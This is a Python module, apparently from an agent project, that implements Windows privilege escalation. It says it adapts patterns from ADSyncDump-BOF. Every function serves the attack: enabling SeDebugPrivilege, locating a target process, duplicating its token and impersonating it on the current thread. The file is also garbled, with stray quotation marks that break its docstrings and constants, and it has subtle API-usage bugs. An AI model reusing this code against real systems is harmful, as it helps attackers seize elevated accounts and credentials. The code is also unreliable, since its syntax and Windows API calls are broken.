#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");"# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,"# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""""""Module: privilege_escalation_core
Core logic for Windows privilege escalation operations.
Implements token manipulation and privilege enabling patterns from ADSyncDump-BOF.
"""""""
from __future__ import annotations

import ctypes
from ctypes import wintypes
from typing import Optional, Tuple

# Windows API constants
SE_PRIVILEGE_ENABLED = 0x00000002
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_IMPERSONATE = 0x0004
PROCESS_QUERY_INFORMATION = 0x0400
SECURITY_IMPERSONATION = 2
TOKEN_TYPE_IMPERSONATION = 1
TH32CS_SNAPPROCESS = 0x00000002

# Privilege constants
SE_DEBUG_NAME = "SeDebugPrivilege""SE_IMPERSONATE_NAME = "SeImpersonatePrivilege""

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]"

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]"

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),"        ("Privileges", LUID_AND_ATTRIBUTES * 1)"    ]


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),"        ("cntUsage", wintypes.DWORD),"        ("th32ProcessID", wintypes.DWORD),"        ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),"        ("th32ModuleID", wintypes.DWORD),"        ("cntThreads", wintypes.DWORD),"        ("th32ParentProcessID", wintypes.DWORD),"        ("pcPriClassBase", wintypes.LONG),"        ("dwFlags", wintypes.DWORD),"        ("szExeFile", wintypes.CHAR * 260)"    ]


class PrivilegeEscalationCore:
    """Core class for Windows privilege escalation operations."""""""
    def __init__(self) -> None:
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32

    def enable_privilege(self, privilege_name: str) -> bool:
        """Enable a Windows privilege for the current process."""""""        try:
            # Get current process token
            token_handle = wintypes.HANDLE()
            if not self.advapi32.OpenProcessToken(
                self.kernel32.GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(token_handle)
            ):
                return False

            # Look up privilege LUID
            luid = LUID()
            if not self.advapi32.LookupPrivilegeValueW(
                None, privilege_name, ctypes.byref(luid)
            ):
                self.kernel32.CloseHandle(token_handle)
                return False

            # Set up privilege structure
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0].Luid = luid
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

            # Adjust token privileges
            if not self.advapi32.AdjustTokenPrivileges(
                token_handle, False, ctypes.byref(tp), 0, None, None
            ):
                self.kernel32.CloseHandle(token_handle)
                return False

            self.kernel32.CloseHandle(token_handle)
            return True

        except Exception:
            return False

    def find_process_by_name(self, process_name: str) -> Optional[int]:
        """Find process ID by executable name."""""""        try:
            snapshot = self.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot == -1:
                return None

            entry = PROCESSENTRY32()
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

            if not self.kernel32.Process32FirstW(snapshot, ctypes.byref(entry)):
                self.kernel32.CloseHandle(snapshot)
                return None

            while True:
                exe_name = entry.szExeFile.decode('utf-8', errors='ignore')'                if exe_name.lower() == process_name.lower():
                    self.kernel32.CloseHandle(snapshot)
                    return entry.th32ProcessID

                if not self.kernel32.Process32NextW(snapshot, ctypes.byref(entry)):
                    break

            self.kernel32.CloseHandle(snapshot)
            return None

        except Exception:
            return None

    def impersonate_process_token(self, process_id: int) -> Tuple[bool, Optional[wintypes.HANDLE]]:
        """Impersonate the token of a target process."""""""        try:
            # Open target process
            process_handle = self.kernel32.OpenProcess(
                PROCESS_QUERY_INFORMATION, False, process_id
            )
            if not process_handle:
                return False, None

            # Open process token
            token_handle = wintypes.HANDLE()
            if not self.advapi32.OpenProcessToken(
                process_handle,
                TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE,
                ctypes.byref(token_handle)
            ):
                self.kernel32.CloseHandle(process_handle)
                return False, None

            # Duplicate token
            dup_token = wintypes.HANDLE()
            if not self.advapi32.DuplicateTokenEx(
                token_handle,
                TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE,
                None,
                SECURITY_IMPERSONATION,
                TOKEN_TYPE_IMPERSONATION,
                ctypes.byref(dup_token)
            ):
                self.kernel32.CloseHandle(token_handle)
                self.kernel32.CloseHandle(process_handle)
                return False, None

            # Set thread token
            thread_handle = self.kernel32.GetCurrentThread()
            if not self.advapi32.SetThreadToken(ctypes.byref(thread_handle), dup_token):
                self.kernel32.CloseHandle(dup_token)
                self.kernel32.CloseHandle(token_handle)
                self.kernel32.CloseHandle(process_handle)
                return False, None

            # Clean up handles
            self.kernel32.CloseHandle(token_handle)
            self.kernel32.CloseHandle(process_handle)

            return True, dup_token

        except Exception:
            return False, None

    def revert_to_self(self) -> bool:
        """Revert token impersonation."""""""        try:
            return bool(self.advapi32.RevertToSelf())
        except Exception:
            return False
